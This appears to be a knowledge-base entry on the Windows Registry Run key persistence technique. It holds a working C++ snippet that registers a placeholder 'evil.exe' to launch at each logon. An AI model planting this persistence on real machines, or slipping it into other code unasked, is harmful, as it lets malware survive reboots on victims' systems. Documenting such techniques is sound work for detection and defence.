---
title: Registry RunKey for Persistence
description:
type: Persistence
platforms:
    - Windows
actors:
malwares:
link_atomicredteam:
link_mitreattack:
refs:
pubDate: 2024-06-30
---

Attackers can leverage the Registry RunKey (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) to execute arbitrary program when target system boots.

```c++
// persist.cpp

HKEY hKey;
std::wstring wSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
std::wstring wValue = L"abcdef012345"; // Random value here

// Set our executable path to be run
LPCWSTR lpExePath = L"C:\\Users\\Bob\\AppData\\Local\\Temp\\evil.exe";

LONG result = RegOpenKeyExW(
    HKEY_CURRENT_USER,
    wSubKey.c_str(),
    0,
    KEY_SET_VALUE,
    &hKey
);
if (result != ERROR_SUCCESS)
{
    return EXIT_FAILURE;
}

result = RegSetValueExW(
    hKey,
    wValue.c_str(),
    0,
    REG_SZ,
    (BYTE*)lpExePath,
    (wcslen(lpExePath) + 1) * sizeof(WCHAR)
);
RegCloseKey(hKey);

if (result == ERROR_SUCCESS)
{
    return EXIT_SUCCESS;
}
else
{
    return EXIT_FAILURE;
}
```